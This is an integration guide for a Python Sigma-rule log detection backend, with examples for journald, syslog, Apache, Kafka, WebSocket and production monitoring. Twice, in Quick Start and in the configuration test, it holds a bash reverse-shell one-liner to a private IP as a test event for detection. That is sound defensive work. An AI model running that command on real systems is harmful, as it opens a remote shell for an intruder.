# Sigma Simple Backend - Integration Guide

This guide shows how to integrate the Sigma Simple Backend with various platforms and logging systems.

## Table of Contents

- [Quick Start](#quick-start)
- [System Integration](#system-integration)
- [Log Format Integration](#log-format-integration)
- [Real-time Monitoring](#real-time-monitoring)
- [Production Deployment](#production-deployment)
- [Troubleshooting](#troubleshooting)

## Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/texasbe2trill/sigma-linux-backend.git
cd sigma-linux-backend

# Or download just the main file
wget https://raw.githubusercontent.com/texasbe2trill/sigma-linux-backend/main/sigma_simple_backend.py
```

### Basic Setup

```python
from sigma_simple_backend import SimpleEvalBackend, RestrictivenessLevel, MockRuleCollection

# Initialize backend
backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)

# Load rules (use real Sigma rules in production)
rule_collection = MockRuleCollection()
compiled_rules = backend.compile(rule_collection)

# Test with sample event
event = {
    "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "_COMM": "bash"
}

# Check for threats
for rule_func in compiled_rules:
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        print(f"🚨 Threat detected: {alert.rule_title}")
```

### Running the Examples

The repository includes comprehensive examples:

```bash
# Basic usage with different restrictiveness levels
python examples/basic_usage.py

# Real-time journald monitoring
python examples/journald_integration.py --monitor-commands

# Custom log format processing
python examples/custom_log_format.py

# Using real Sigma rules (requires PyYAML)
pip install pyyaml
python examples/real_sigma_rules.py --download-rules
python examples/real_sigma_rules.py --live-monitor
```

## System Integration

### Systemd Journald

Monitor system logs in real-time:

```python
import json
import subprocess
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

def monitor_journald():
    backend = SimpleEvalBackend()
    compiled_rules = backend.compile(MockRuleCollection())

    # Start journald stream
    process = subprocess.Popen(
        ["journalctl", "-o", "json", "-f"],
        stdout=subprocess.PIPE,
        text=True
    )

    for line in process.stdout:
        try:
            log_entry = json.loads(line.strip())

            # Convert journald format
            event = {
                "MESSAGE": log_entry.get("MESSAGE", ""),
                "_COMM": log_entry.get("_COMM", ""),
                "_CMDLINE": log_entry.get("_CMDLINE", ""),
                "_PID": log_entry.get("_PID", ""),
            }

            # Check for threats
            for rule_func in compiled_rules:
                alert = backend.test_rule_against_event(rule_func, event)
                if alert:
                    handle_alert(alert, event)

        except json.JSONDecodeError:
            continue

def handle_alert(alert, event):
    print(f"🚨 {alert.rule_title} - {alert.severity}")
    # Send to SIEM, log to file, etc.

if __name__ == "__main__":
    monitor_journald()
```

### Syslog Integration

Process syslog messages:

```python
import socket
import re
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class SyslogMonitor:
    def __init__(self):
        # Custom field mappings for syslog
        syslog_mappings = {
            "process.name": "program",
            "log.message": "message",
            "host.name": "hostname",
        }

        self.backend = SimpleEvalBackend(field_mappings=syslog_mappings)
        self.compiled_rules = self.backend.compile(MockRuleCollection())

    def parse_syslog(self, message):
        """Parse syslog message format"""
        # Simple syslog parsing (enhance as needed)
        pattern = r'<\d+>(.+?) (\S+) (\S+): (.+)'
        match = re.match(pattern, message)

        if match:
            return {
                "timestamp": match.group(1),
                "hostname": match.group(2),
                "program": match.group(3),
                "message": match.group(4)
            }
        return None

    def start_udp_listener(self, port=514):
        """Listen for UDP syslog messages"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', port))

        print(f"Listening for syslog on UDP port {port}")

        while True:
            data, addr = sock.recvfrom(1024)
            message = data.decode('utf-8', errors='ignore')

            event = self.parse_syslog(message)
            if event:
                self.check_event(event)

    def check_event(self, event):
        """Check event against Sigma rules"""
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                print(f"🚨 Syslog Alert: {alert.rule_title}")

# Usage
monitor = SyslogMonitor()
monitor.start_udp_listener()
```

### File Monitoring

Monitor log files for changes:

```python
import time
import os
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class LogFileMonitor:
    def __init__(self, log_file_path):
        self.log_file_path = log_file_path
        self.backend = SimpleEvalBackend()
        self.compiled_rules = self.backend.compile(MockRuleCollection())
        self.last_position = 0

    def follow_file(self):
        """Follow log file like 'tail -f'"""
        with open(self.log_file_path, 'r') as f:
            # Go to end of file
            f.seek(0, 2)
            self.last_position = f.tell()

            while True:
                # Check for new content
                f.seek(self.last_position)
                new_lines = f.readlines()

                if new_lines:
                    for line in new_lines:
                        self.process_log_line(line.strip())

                    self.last_position = f.tell()

                time.sleep(1)  # Check every second

    def process_log_line(self, line):
        """Process a single log line"""
        # Convert log line to event format
        event = {
            "MESSAGE": line,
            "log.message": line
        }

        # Extract process name if possible
        if " " in line:
            parts = line.split()
            if len(parts) > 2:
                event["_COMM"] = parts[2].rstrip(":")

        # Check against rules
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                print(f"🚨 File Alert: {alert.rule_title}")
                print(f"   Line: {line[:100]}...")

# Usage
monitor = LogFileMonitor("/var/log/syslog")
monitor.follow_file()
```

## Log Format Integration

### Apache Access Logs

```python
import re
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class ApacheLogMonitor:
    def __init__(self):
        # Field mappings for Apache logs
        apache_mappings = {
            "source.ip": "client_ip",
            "http.request.method": "method",
            "url.path": "path",
            "user_agent.original": "user_agent",
            "log.message": "raw_log"
        }

        self.backend = SimpleEvalBackend(field_mappings=apache_mappings)
        self.compiled_rules = self.backend.compile(MockRuleCollection())

    def parse_apache_log(self, line):
        """Parse Apache common log format"""
        pattern = r'(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) \S+" (\d+) \S+ "([^"]*)" "([^"]*)"'
        match = re.match(pattern, line)

        if match:
            return {
                "client_ip": match.group(1),
                "timestamp": match.group(2),
                "method": match.group(3),
                "path": match.group(4),
                "status": match.group(5),
                "referer": match.group(6),
                "user_agent": match.group(7),
                "raw_log": line
            }
        return None

    def process_log(self, log_file):
        """Process Apache log file"""
        with open(log_file, 'r') as f:
            for line in f:
                event = self.parse_apache_log(line.strip())
                if event:
                    self.check_event(event)

    def check_event(self, event):
        """Check event against rules"""
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                print(f"🚨 Web Attack: {alert.rule_title}")
                print(f"   {event['method']} {event['path']} from {event['client_ip']}")

# Usage
monitor = ApacheLogMonitor()
monitor.process_log("/var/log/apache2/access.log")
```

### JSON Logs

```python
import json
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

def process_json_logs(log_file):
    """Process structured JSON logs"""

    # Custom mappings for your JSON format
    json_mappings = {
        "process.name": "process.executable",
        "process.command_line": "process.args",
        "user.name": "user.name",
        "host.name": "agent.hostname"
    }

    backend = SimpleEvalBackend(field_mappings=json_mappings)
    compiled_rules = backend.compile(MockRuleCollection())

    with open(log_file, 'r') as f:
        for line in f:
            try:
                event = json.loads(line)

                # Flatten nested JSON if needed
                flat_event = flatten_json(event)

                # Check for threats
                for rule_func in compiled_rules:
                    alert = backend.test_rule_against_event(rule_func, flat_event)
                    if alert:
                        print(f"🚨 JSON Alert: {alert.rule_title}")

            except json.JSONDecodeError:
                continue

def flatten_json(nested_json, separator='.'):
    """Flatten nested JSON structure"""
    def _flatten(obj, parent_key=''):
        items = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_key = f"{parent_key}{separator}{k}" if parent_key else k
                items.extend(_flatten(v, new_key).items())
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                new_key = f"{parent_key}{separator}{i}" if parent_key else str(i)
                items.extend(_flatten(v, new_key).items())
        else:
            return {parent_key: obj}
        return dict(items)

    return _flatten(nested_json)

# Usage
process_json_logs("/var/log/app/security.json")
```

## Real-time Monitoring

### Streaming with Message Queues

```python
import json
from kafka import KafkaConsumer  # pip install kafka-python
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class KafkaSecurityMonitor:
    def __init__(self, kafka_servers, topic):
        self.backend = SimpleEvalBackend()
        self.compiled_rules = self.backend.compile(MockRuleCollection())

        self.consumer = KafkaConsumer(
            topic,
            bootstrap_servers=kafka_servers,
            value_deserializer=lambda m: json.loads(m.decode('utf-8'))
        )

    def start_monitoring(self):
        """Start consuming messages from Kafka"""
        print("Starting Kafka security monitoring...")

        for message in self.consumer:
            event = message.value

            # Process event
            for rule_func in self.compiled_rules:
                alert = self.backend.test_rule_against_event(rule_func, event)
                if alert:
                    self.handle_alert(alert, event)

    def handle_alert(self, alert, event):
        """Handle security alerts from Kafka messages"""
        print(f"🚨 Kafka Alert: {alert.rule_title}")

        # Send to another Kafka topic for alerts
        # self.producer.send('security-alerts', alert.__dict__)

# Usage
monitor = KafkaSecurityMonitor(['localhost:9092'], 'system-logs')
monitor.start_monitoring()
```

### WebSocket Integration

```python
import asyncio
import websockets
import json
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class WebSocketSecurityMonitor:
    def __init__(self):
        self.backend = SimpleEvalBackend()
        self.compiled_rules = self.backend.compile(MockRuleCollection())

    async def handle_client(self, websocket, path):
        """Handle WebSocket client connections"""
        print(f"Client connected: {websocket.remote_address}")

        try:
            async for message in websocket:
                try:
                    event = json.loads(message)
                    await self.process_event(websocket, event)
                except json.JSONDecodeError:
                    await websocket.send(json.dumps({"error": "Invalid JSON"}))
        except websockets.exceptions.ConnectionClosed:
            print(f"Client disconnected: {websocket.remote_address}")

    async def process_event(self, websocket, event):
        """Process incoming event"""
        alerts = []

        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                alerts.append({
                    "rule_title": alert.rule_title,
                    "severity": alert.severity,
                    "description": alert.description
                })

        # Send response back to client
        response = {
            "event_id": event.get("id", "unknown"),
            "alerts": alerts,
            "threat_detected": len(alerts) > 0
        }

        await websocket.send(json.dumps(response))

    def start_server(self, host="localhost", port=8765):
        """Start WebSocket server"""
        print(f"Starting WebSocket security server on {host}:{port}")
        start_server = websockets.serve(self.handle_client, host, port)
        asyncio.get_event_loop().run_until_complete(start_server)
        asyncio.get_event_loop().run_forever()

# Usage
monitor = WebSocketSecurityMonitor()
monitor.start_server()
```

## Production Deployment

### Configuration Management

```python
import yaml
from sigma_simple_backend import SimpleEvalBackend, RestrictivenessLevel

class ProductionSecurityMonitor:
    def __init__(self, config_file):
        self.config = self.load_config(config_file)
        self.setup_backend()

    def load_config(self, config_file):
        """Load configuration from YAML file"""
        with open(config_file, 'r') as f:
            return yaml.safe_load(f)

    def setup_backend(self):
        """Setup backend with production configuration"""
        restrictiveness_map = {
            "permissive": RestrictivenessLevel.PERMISSIVE,
            "balanced": RestrictivenessLevel.BALANCED,
            "restrictive": RestrictivenessLevel.RESTRICTIVE,
            "ultra": RestrictivenessLevel.ULTRA_RESTRICTIVE
        }

        restrictiveness = restrictiveness_map.get(
            self.config.get('restrictiveness', 'balanced')
        )

        field_mappings = self.config.get('field_mappings', {})

        self.backend = SimpleEvalBackend(
            restrictiveness=restrictiveness,
            field_mappings=field_mappings
        )

        # Load rules (implement rule loading from files)
        self.compiled_rules = self.load_and_compile_rules()

    def load_and_compile_rules(self):
        """Load and compile rules from configuration"""
        # In production, load real Sigma rules from files
        from sigma_simple_backend import MockRuleCollection
        rule_collection = MockRuleCollection()
        return self.backend.compile(rule_collection)

# Example config.yaml:
# restrictiveness: restrictive
# field_mappings:
#   process.name: proc_name
#   log.message: message
# alert_destinations:
#   - type: syslog
#     server: "siem.company.com"
#   - type: email
#     recipients: ["security@company.com"]
```

### Logging and Metrics

```python
import logging
import time
from collections import defaultdict
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

class ProductionMonitor:
    def __init__(self):
        self.setup_logging()
        self.backend = SimpleEvalBackend()
        self.compiled_rules = self.backend.compile(MockRuleCollection())
        self.metrics = defaultdict(int)
        self.start_time = time.time()

    def setup_logging(self):
        """Setup production logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('/var/log/sigma-monitor/alerts.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('sigma-monitor')

    def process_event(self, event):
        """Process event with metrics and logging"""
        self.metrics['events_processed'] += 1

        alerts = []
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                alerts.append(alert)
                self.metrics['alerts_generated'] += 1
                self.handle_alert(alert, event)

        return alerts

    def handle_alert(self, alert, event):
        """Handle alert with proper logging"""
        self.logger.warning(
            f"Security Alert: {alert.rule_title} | "
            f"Severity: {alert.severity} | "
            f"Event: {event.get('MESSAGE', 'N/A')[:100]}"
        )

        # Send to external systems
        self.send_to_siem(alert, event)

        if alert.severity in ['high', 'critical']:
            self.send_urgent_notification(alert, event)

    def send_to_siem(self, alert, event):
        """Send alert to SIEM system"""
        # Implement SIEM integration
        pass

    def send_urgent_notification(self, alert, event):
        """Send urgent notification for high-severity alerts"""
        # Implement notification system
        pass

    def get_metrics(self):
        """Get monitoring metrics"""
        uptime = time.time() - self.start_time
        return {
            'uptime_seconds': uptime,
            'events_processed': self.metrics['events_processed'],
            'alerts_generated': self.metrics['alerts_generated'],
            'events_per_second': self.metrics['events_processed'] / uptime,
            'alert_rate': self.metrics['alerts_generated'] / max(self.metrics['events_processed'], 1)
        }
```

### Health Monitoring

```python
from flask import Flask, jsonify  # pip install flask
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

app = Flask(__name__)

class HealthMonitor:
    def __init__(self):
        self.backend = SimpleEvalBackend()
        self.compiled_rules = self.backend.compile(MockRuleCollection())
        self.is_healthy = True
        self.last_check = time.time()

    def health_check(self):
        """Perform health check"""
        try:
            # Test backend functionality
            test_event = {"MESSAGE": "test", "_COMM": "test"}

            for rule_func in self.compiled_rules[:5]:  # Test first 5 rules
                self.backend.test_rule_against_event(rule_func, test_event)

            self.is_healthy = True
            self.last_check = time.time()
            return True

        except Exception as e:
            self.is_healthy = False
            return False

monitor = HealthMonitor()

@app.route('/health')
def health():
    """Health check endpoint"""
    is_healthy = monitor.health_check()

    return jsonify({
        'status': 'healthy' if is_healthy else 'unhealthy',
        'timestamp': time.time(),
        'rules_loaded': len(monitor.compiled_rules)
    }), 200 if is_healthy else 503

@app.route('/metrics')
def metrics():
    """Metrics endpoint"""
    # Add your metrics collection here
    return jsonify({
        'rules_compiled': len(monitor.compiled_rules),
        'backend_restrictiveness': monitor.backend.restrictiveness.value,
        'last_health_check': monitor.last_check
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

## Troubleshooting

### Common Issues

1. **No alerts generated for suspicious events**

   - Check restrictiveness level (try PERMISSIVE for testing)
   - Verify field mappings match your log format
   - Test with mock rule collection first

2. **Too many false positives**

   - Increase restrictiveness level
   - Customize field mappings for your environment
   - Filter out known legitimate patterns

3. **Performance issues**
   - Use appropriate restrictiveness level
   - Compile rules once, reuse compiled functions
   - Consider batching events for processing

### Debug Mode

```python
import logging
from sigma_simple_backend import SimpleEvalBackend, MockRuleCollection

# Enable debug logging
logging.basicConfig(level=logging.DEBUG)

backend = SimpleEvalBackend()
compiled_rules = backend.compile(MockRuleCollection())

# Test with debug info
event = {"MESSAGE": "suspicious command", "_COMM": "bash"}

for i, rule_func in enumerate(compiled_rules):
    print(f"Testing rule {i+1}/{len(compiled_rules)}")
    alert = backend.test_rule_against_event(rule_func, event)
    if alert:
        print(f"  ✓ Alert: {alert.rule_title}")
    else:
        print(f"  - No match")
```

### Testing Configuration

```python
def test_configuration():
    """Test your configuration"""

    # Test backend initialization
    try:
        backend = SimpleEvalBackend()
        print("✓ Backend initialized successfully")
    except Exception as e:
        print(f"✗ Backend initialization failed: {e}")
        return

    # Test rule compilation
    try:
        rules = backend.compile(MockRuleCollection())
        print(f"✓ Compiled {len(rules)} rules successfully")
    except Exception as e:
        print(f"✗ Rule compilation failed: {e}")
        return

    # Test with known malicious event
    malicious_event = {
        "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        "_COMM": "bash"
    }

    alerts = []
    for rule_func in rules:
        alert = backend.test_rule_against_event(rule_func, malicious_event)
        if alert:
            alerts.append(alert)

    if alerts:
        print(f"✓ Detection working: {len(alerts)} alerts for malicious event")
    else:
        print("⚠ Warning: No alerts for known malicious event")

    # Test with benign event
    benign_event = {
        "MESSAGE": "ls -la /home/user",
        "_COMM": "ls"
    }

    benign_alerts = []
    for rule_func in rules:
        alert = backend.test_rule_against_event(rule_func, benign_event)
        if alert:
            benign_alerts.append(alert)

    if benign_alerts:
        print(f"⚠ Warning: {len(benign_alerts)} false positives for benign event")
    else:
        print("✓ No false positives for benign event")

if __name__ == "__main__":
    test_configuration()
```

This integration guide provides comprehensive examples for integrating the Sigma Simple Backend with various systems and platforms. Adapt the examples to your specific environment and requirements.
